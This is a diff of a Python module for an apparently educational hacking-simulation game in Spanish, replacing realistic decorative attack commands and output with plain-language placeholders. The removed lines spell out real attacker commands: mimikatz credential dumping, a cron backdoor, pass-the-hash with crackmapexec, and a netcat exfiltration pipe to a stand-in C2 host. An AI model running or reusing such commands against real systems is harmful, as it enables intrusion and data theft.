@@ -10,8 +10,10 @@ extensión, cerrado a modificación).
 El registro TECNICA_POR_ID es un diccionario CERRADO: el id que manda el
 cliente solo sirve como clave, nunca para importar código (sin reflexión).
 
-Son PARÁMETROS de simulación, no comandos reales: `comandoEjemplo` es texto
-decorativo para la terminal del juego.
+Son PARÁMETROS de simulación, no comandos reales: `comandoEjemplo` y los textos
+de salida son decorativos para la terminal del juego. Están escritos en lenguaje
+sencillo a propósito (fácil de entender, sin jerga), sin perder la sensación de
+estar frente a un sistema real.
 """
 
 from typing import Optional
@@ -53,18 +55,18 @@ class Tecnica:
     def validar(self, e, n) -> Optional[str]:
         """Regla por defecto: nodo alcanzable y kill chain en orden. None = válida."""
         if not e.alcanzable(n['id']):
-            return 'Nodo no alcanzable (necesitas un foothold adyacente)'
+            return 'Todavía no puedes llegar aquí: primero toma una PC vecina.'
         fx = fase_index(n['fase'])
         if fx < fase_index(self.faseRequiere):
-            return f'Requiere fase previa: {self.faseRequiere}'
+            return 'Te falta un paso antes de poder hacer esto en esta PC.'
         if fx >= fase_index(self.faseProduce):
-            return 'Fase ya alcanzada en este nodo'
+            return 'Ya hiciste esto en esta PC.'
         return None
 
     def efecto(self, e, n) -> str:
         """Aplica el éxito y devuelve la salida para la terminal del atacante."""
         n['fase'] = fase_max(n['fase'], self.faseProduce)
-        return f"[+] SUCCESS: {self.nombre} exitosa sobre {n['nombre']}."
+        return f"Listo: {self.nombre} funcionó en {n['nombre']}."
 
 
 class _SinRequisitoDeFase(Tecnica):
@@ -72,200 +74,200 @@ class _SinRequisitoDeFase(Tecnica):
 
     def validar(self, e, n):
         if not e.alcanzable(n['id']):
-            return 'Nodo no alcanzable (necesitas un foothold adyacente)'
+            return 'Todavía no puedes llegar aquí: primero toma una PC vecina.'
         return None
 
 
 class Portscan(Tecnica):
-    id, nombre, tacticaMitre = 'portscan', 'Barrido de puertos', 'TA0007 Discovery'
+    id, nombre, tacticaMitre = 'portscan', 'Escanear la red', 'TA0007 Discovery'
     faseProduce, ruido, facilidadBase, costo, puntos = 'recon', 'alto', 0.9, 1, 5
-    descripcion = 'Descubre puertos, servicios y hosts vecinos. Muy ruidoso, fácil de detectar.'
-    comandoEjemplo = 'nmap -sS -T4 -p- {target}'
+    descripcion = 'Mira qué programas tiene una PC y descubre sus vecinas. Hace mucho ruido: es fácil que te descubran.'
+    comandoEjemplo = 'escanear-red {target}'
 
     def efecto(self, e, n):
         super().efecto(e, n)
-        return f"[+] RECON: {n['nombre']} escaneado. Servicios: {', '.join(n['servicios'])}. Vecinos revelados en el mapa."
+        return f"Revisé {n['nombre']}. Programas que encontré: {', '.join(n['servicios'])}. Ya aparecen sus PCs vecinas en el mapa."
 
 
 class Enumeracion(Tecnica):
-    id, nombre, tacticaMitre = 'enum', 'Enumeración de servicios', 'TA0007 Discovery'
+    id, nombre, tacticaMitre = 'enum', 'Buscar fallas', 'TA0007 Discovery'
     faseProduce, ruido, facilidadBase, costo, puntos = 'recon', 'medio', 0.8, 1, 5
-    descripcion = 'Identifica versiones, banners y configuraciones vulnerables (más sigiloso que el barrido).'
-    comandoEjemplo = 'nmap -sV -sC --version-all {target}'
+    descripcion = 'Averigua qué versiones usa la PC para encontrarle fallas conocidas. Más silencioso que escanear toda la red.'
+    comandoEjemplo = 'buscar-fallas {target}'
 
     def efecto(self, e, n):
         super().efecto(e, n)
         cves = ', '.join(v.get('cve') or v['id'] for v in n['vulnerabilidades']) or 'ninguna'
-        return f"[+] ENUM: versiones identificadas en {n['nombre']}. Vulnerabilidades: {cves}."
+        return f"Encontré las fallas de {n['nombre']}: {cves}."
 
 
 class ScanDocs(_SinRequisitoDeFase):
-    id, nombre, tacticaMitre = 'scan_docs', 'Búsqueda de .env y documentos', 'TA0009 Collection'
+    id, nombre, tacticaMitre = 'scan_docs', 'Buscar archivos secretos', 'TA0009 Collection'
     faseProduce, ruido, facilidadBase, costo, puntos = 'recon', 'bajo', 0.85, 2, 5
-    descripcion = 'Busca variables .env, tokens, backups y documentos confidenciales expuestos.'
-    comandoEjemplo = 'gobuster dir -u http://{target} -w sec_files.txt -x env,bak,docx,pdf,sql'
+    descripcion = 'Rebusca contraseñas, archivos de configuración, copias de seguridad y documentos confidenciales que quedaron expuestos.'
+    comandoEjemplo = 'buscar-archivos {target}'
 
     def efecto(self, e, n):
         n['fase'] = n['fase'] or 'recon'
         sensibles = n.get('archivosSensibles') or []
         nuevos = 0
         for archivo in sensibles:
-            tipo, secreto = 'doc', 'Documento clasificado interno de la organización.'
+            tipo, secreto = 'doc', 'Documento interno confidencial de la organización.'
             if 'env' in archivo:
-                tipo, secreto = 'env', f"DB_USER=admin_{n['id']} | DB_PASS=Secret@2026! | JWT_SECRET=sk_live_948f2a1b_{n['id']}"
+                tipo, secreto = 'env', f"Usuario y contraseña de la base de datos de {n['nombre']} (información muy sensible)."
             elif 'sql' in archivo or 'dump' in archivo or 'tar.gz' in archivo:
-                tipo, secreto = 'db', f"DUMP_SQL: {archivo} ({n['valor'] * 2.8:.1f} MB con registros confidenciales)"
+                tipo, secreto = 'db', f"Copia de la base de datos: {archivo} ({n['valor'] * 2.8:.1f} MB de registros confidenciales)."
             elif any(k in archivo for k in ('pass', 'rsa', 'vault', 'key')):
-                tipo, secreto = 'cred', f'CREDENTIALS: Clave privada / hash extraído de {archivo}'
+                tipo, secreto = 'cred', f'Contraseña o llave privada sacada de {archivo}.'
             nuevos += e.agregar_loot(n, archivo, tipo, secreto)
-        lista = '\n'.join(f'    * [ARCH_EXPUESTO] {s}' for s in sensibles)
-        return f"[+] VULN DISCOVERY: {nuevos} archivos nuevos en {n['nombre']}:\n{lista}"
+        lista = '\n'.join(f'    • {s}' for s in sensibles)
+        return f"Encontré {nuevos} archivos secretos nuevos en {n['nombre']}:\n{lista}"
 
 
 class Bruteforce(Tecnica):
-    id, nombre, tacticaMitre = 'bruteforce', 'Fuerza de credenciales', 'TA0006 Credential Access'
+    id, nombre, tacticaMitre = 'bruteforce', 'Adivinar la contraseña', 'TA0006 Credential Access'
     faseRequiere, faseProduce, ruido, facilidadBase, costo, puntos = 'recon', 'acceso_inicial', 'medio', 0.55, 2, 20
-    descripcion = 'Ataque de diccionario contra servicios con credenciales débiles.'
-    comandoEjemplo = 'hydra -L users.txt -P rockyou.txt {target} ssh'
+    descripcion = 'Prueba miles de contraseñas comunes hasta que una entra. Deja rastro.'
+    comandoEjemplo = 'adivinar-contraseña {target}'
 
 
 class Exploit(Tecnica):
-    id, nombre, tacticaMitre = 'exploit', 'Explotación de servicio (RCE)', 'TA0001 Initial Access'
+    id, nombre, tacticaMitre = 'exploit', 'Entrar por una falla', 'TA0001 Initial Access'
     faseRequiere, faseProduce, ruido, facilidadBase, costo, puntos = 'recon', 'acceso_inicial', 'bajo', 0.45, 3, 25
-    descripcion = 'Abusa un CVE crítico (RCE / inyección). Sigiloso pero menos probable.'
-    comandoEjemplo = 'python3 exploit_cve.py --rhost {target} --payload reverse_tcp'
+    descripcion = 'Aprovecha una falla grave del programa para meterse. Es silencioso, pero no siempre funciona.'
+    comandoEjemplo = 'entrar-por-falla {target}'
 
     def efecto(self, e, n):
         super().efecto(e, n)
-        return f"[+] RCE SHELL OPEN: shell remota establecida en {n['nombre']}."
+        return f"¡Entré! Conseguí el control de {n['nombre']} aprovechando una falla."
 
 
 class SqliDump(Tecnica):
-    id, nombre, tacticaMitre = 'sqli_dump', 'Inyección SQL & volcado de tablas', 'TA0001 Initial Access / TA0009 Collection'
+    id, nombre, tacticaMitre = 'sqli_dump', 'Robar la base de datos', 'TA0001 Initial Access / TA0009 Collection'
     faseRequiere, faseProduce, ruido, facilidadBase, costo, puntos = 'recon', 'acceso_inicial', 'medio', 0.6, 3, 25
-    descripcion = 'Explota inyección SQL para sustraer esquemas, contraseñas y tablas.'
-    comandoEjemplo = 'sqlmap -u http://{target}/api/v1 --batch --dump-all --threads=4'
+    descripcion = 'Aprovecha una falla en la página web para sacar tablas, usuarios y contraseñas de la base de datos.'
+    comandoEjemplo = 'robar-base-datos {target}'
 
     def validar(self, e, n):
         if 'sql' not in n['servicios'] and 'http' not in n['servicios']:
-            return 'El nodo no expone HTTP ni SQL'
+            return 'Esta PC no tiene una página web ni una base de datos para atacar.'
         return _SinRequisitoDeFase.validar(self, e, n)
 
     def efecto(self, e, n):
         n['fase'] = fase_max(n['fase'], 'acceso_inicial')
-        e.agregar_loot(n, f"sqli_dump_{n['id']}.sql", 'db',
-                       f"SQL TABLE DUMP: 'usuarios', 'roles', 'transacciones' ({n['valor'] * 1.8:.1f} MB).")
+        e.agregar_loot(n, f"datos_{n['id']}.sql", 'db',
+                       f"Tablas robadas: usuarios, roles y transacciones ({n['valor'] * 1.8:.1f} MB).")
         for archivo in n.get('archivosSensibles') or []:
             if 'sql' in archivo or 'dump' in archivo:
-                e.agregar_loot(n, archivo, 'db', f'EXTRACTED SQL TABLE: {archivo} vía inyección de consultas.')
-        return (f"[+] SQLMAP - INYECCIÓN SQL EXITOSA en {n['nombre']}:\n"
-                f"    [+] Tablas: ['usuarios_admin', 'cuentas_2026', 'sesiones_activas']\n"
-                f"    [+] Registros guardados en C2: sqli_dump_{n['id']}.sql")
+                e.agregar_loot(n, archivo, 'db', f'Tabla extraída de la base de datos: {archivo}.')
+        return (f"¡Robé la base de datos de {n['nombre']}!\n"
+                f"    • Tablas: usuarios, cuentas y sesiones\n"
+                f"    • Guardado como: datos_{n['id']}.sql")
 
 
 class Privesc(Tecnica):
-    id, nombre, tacticaMitre = 'privesc', 'Escalada de privilegios', 'TA0004 Privilege Escalation'
+    id, nombre, tacticaMitre = 'privesc', 'Volverse administrador', 'TA0004 Privilege Escalation'
     faseRequiere, faseProduce, ruido, facilidadBase, costo, puntos = 'acceso_inicial', 'escalada', 'bajo', 0.5, 3, 30
-    descripcion = 'Explota debilidades locales para obtener ROOT / SYSTEM.'
-    comandoEjemplo = 'winpeas.exe  # o linpeas.sh'
+    descripcion = 'Aprovecha un descuido para pasar de usuario normal a administrador (control total de la PC).'
+    comandoEjemplo = 'subir-a-administrador {target}'
 
     def efecto(self, e, n):
         super().efecto(e, n)
-        return f"[+] ROOT ACCESS GRANTED: control total de {n['nombre']}."
+        return f"Ahora soy administrador de {n['nombre']}: tengo control total."
 
 
 class DumpLsass(Tecnica):
-    id, nombre, tacticaMitre = 'dump_lsass', 'Volcado de memoria LSASS', 'TA0006 Credential Access'
+    id, nombre, tacticaMitre = 'dump_lsass', 'Robar contraseñas guardadas', 'TA0006 Credential Access'
     faseRequiere, faseProduce, ruido, facilidadBase, costo, puntos = 'escalada', 'escalada', 'medio', 0.7, 3, 15
-    descripcion = 'Extrae hashes NTLM y tickets de la memoria (requiere privilegios).'
-    comandoEjemplo = 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit'
+    descripcion = 'Saca las contraseñas y llaves que la PC tiene guardadas en memoria (hay que ser administrador).'
+    comandoEjemplo = 'copiar-contraseñas {target}'
 
     def validar(self, e, n):
         if fase_index(n['fase']) < fase_index('escalada'):
-            return 'Requiere privilegios elevados (escalada) en el nodo'
+            return 'Primero tienes que ser administrador de esta PC.'
         return None
 
     def efecto(self, e, n):
-        e.agregar_loot(n, f"lsass_hashes_{n['id']}.txt", 'cred',
-                       'NTLM_HASHES: Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::')
+        e.agregar_loot(n, f"contrasenas_{n['id']}.txt", 'cred',
+                       'Contraseñas de administrador copiadas de la memoria de la PC.')
         for archivo in n.get('archivosSensibles') or []:
             if any(k in archivo for k in ('pass', 'rsa', 'key')):
-                e.agregar_loot(n, archivo, 'cred', f'CREDENTIAL VAULT: {archivo} extraído de memoria.')
-        return f"[+] MIMIKATZ: hashes NTLM y TGT de dominio capturados en {n['nombre']}."
+                e.agregar_loot(n, archivo, 'cred', f'Contraseña o llave guardada: {archivo}.')
+        return f"Copié las contraseñas guardadas en {n['nombre']}."
 
 
 class PersistBackdoor(Tecnica):
-    id, nombre, tacticaMitre = 'persist_backdoor', 'Persistencia (Web Shell / Cron)', 'TA0003 Persistence'
+    id, nombre, tacticaMitre = 'persist_backdoor', 'Dejar una puerta trasera', 'TA0003 Persistence'
     faseRequiere, faseProduce, ruido, facilidadBase, costo, puntos = 'acceso_inicial', 'escalada', 'bajo', 0.65, 2, 15
-    descripcion = 'Planta una tarea programada oculta: resiste un SIGKILL (terminar proceso).'
-    comandoEjemplo = 'echo "*/5 * * * * root /bin/c2_beacon" >> /etc/cron.d/sync'
+    descripcion = 'Deja una entrada oculta para volver cuando quieras. Aguanta aunque el defensor cierre el programa.'
+    comandoEjemplo = 'dejar-puerta-trasera {target}'
 
     def validar(self, e, n):
         if fase_index(n['fase']) < fase_index('acceso_inicial'):
-            return 'Requiere acceso inicial previo en el nodo'
+            return 'Primero tienes que entrar a esta PC.'
         if n.get('persistente'):
-            return 'Ya hay persistencia instalada'
+            return 'Ya dejaste una puerta trasera aquí.'
         return None
 
     def efecto(self, e, n):
         n['fase'] = fase_max(n['fase'], 'escalada')
         n['persistente'] = True
-        return f"[+] PERSISTENCIA INSTALADA en {n['nombre']}: cron + webshell (resiste SIGKILL)."
+        return f"Dejé una puerta trasera oculta en {n['nombre']}: puedo volver aunque me cierren el programa."
 
 
 class PhishingSpray(_SinRequisitoDeFase):
-    id, nombre, tacticaMitre = 'phishing_spray', 'Credential Spraying & Pass-the-Hash', 'TA0008 Lateral Movement'
+    id, nombre, tacticaMitre = 'phishing_spray', 'Probar contraseñas robadas', 'TA0008 Lateral Movement'
     faseRequiere, faseProduce, ruido, facilidadBase, costo, puntos = 'recon', 'acceso_inicial', 'medio', 0.55, 2, 20
-    descripcion = 'Prueba credenciales y hashes robados contra SMB, WinRM y SSH.'
-    comandoEjemplo = 'crackmapexec smb {target} -u users.txt -H ntlm_hashes.txt'
+    descripcion = 'Usa contraseñas que ya robaste para entrar a otras PCs que usan la misma clave.'
+    comandoEjemplo = 'probar-contraseñas {target}'
 
     def validar(self, e, n):
         if fase_index(n['fase']) >= fase_index('acceso_inicial'):
-            return 'El nodo ya está comprometido'
+            return 'Esta PC ya es tuya.'
         return super().validar(e, n)
 
     def efecto(self, e, n):
         n['fase'] = fase_max(n['fase'], 'acceso_inicial')
-        return f"[+] CRACKMAPEXEC: autenticación exitosa en {n['nombre']} (Pwn3d!)."
+        return f"Entré a {n['nombre']} reusando una contraseña robada."
 
 
 class Pivot(Tecnica):
-    id, nombre, tacticaMitre = 'pivot', 'Pivote lateral', 'TA0008 Lateral Movement'
+    id, nombre, tacticaMitre = 'pivot', 'Saltar a otra PC', 'TA0008 Lateral Movement'
     faseRequiere, faseProduce, ruido, facilidadBase, costo, puntos = 'escalada', 'acceso_inicial', 'medio', 0.55, 3, 30
-    descripcion = 'Salta desde un vecino con privilegios y compromete este nodo directamente.'
-    comandoEjemplo = 'chisel client {target}:8000 R:socks && proxychains psexec'
+    descripcion = 'Desde una PC que ya controlas, saltas a una vecina y la tomas directamente.'
+    comandoEjemplo = 'saltar-a-otra-pc {target}'
 
     def validar(self, e, n):
         if fase_index(n['fase']) >= fase_index('acceso_inicial'):
-            return 'El nodo ya está comprometido'
+            return 'Esta PC ya es tuya.'
         if not e.tiene_salto_lateral(n['id']):
-            return 'Necesitas un nodo adyacente con privilegios (escalada)'
+            return 'Necesitas una PC vecina donde ya seas administrador.'
         return None
 
     def efecto(self, e, n):
         super().efecto(e, n)
-        return f"[+] PIVOT ESTABLISHED: túnel lateral abierto hacia {n['nombre']}."
+        return f"Salté a {n['nombre']} desde una PC vecina que ya controlaba."
 
 
 class Exfil(Tecnica):
-    id, nombre, tacticaMitre = 'exfil', 'Robo y exfiltración de datos', 'TA0010 Exfiltration'
+    id, nombre, tacticaMitre = 'exfil', 'Llevarse los datos', 'TA0010 Exfiltration'
     faseRequiere, faseProduce, ruido, facilidadBase, costo, puntos = 'acceso_inicial', 'exfiltracion', 'alto', 0.65, 4, 0
-    descripcion = 'Empaqueta y extrae los datos del nodo hacia el C2. Suma al objetivo de victoria.'
-    comandoEjemplo = 'pg_dump {target} | gpg -c | nc -w 3 c2.example 4444'
+    descripcion = 'Empaqueta y se lleva los datos de la PC. Esto es lo que te acerca a ganar.'
+    comandoEjemplo = 'llevarse-datos {target}'
 
     def validar(self, e, n):
         if fase_index(n['fase']) < fase_index('acceso_inicial'):
-            return 'Debes comprometer el nodo antes de exfiltrar'
+            return 'Primero tienes que tomar esta PC.'
         if n['valor'] <= 0:
-            return 'Nodo sin datos de valor'
+            return 'Esta PC no tiene datos que valga la pena robar.'
         if n['id'] in e.exfiltrados:
-            return 'Datos ya exfiltrados de este nodo'
+            return 'Ya te llevaste los datos de esta PC.'
         return None
 
     def efecto(self, e, n):
         e.registrar_exfiltracion(n)
-        return (f"[+] EXFILTRATION: {n['valor']} MB de {n['nombre']} enviados al C2 "
-                f"(total {e.datos_exfiltrados}/{e.meta_exfiltracion} MB).")
+        return (f"¡Me llevé {n['valor']} MB de {n['nombre']}! "
+                f"(llevas {e.datos_exfiltrados} de {e.meta_exfiltracion} MB para ganar).")
 
 
 # Registro cerrado (orden = orden en el panel del atacante).
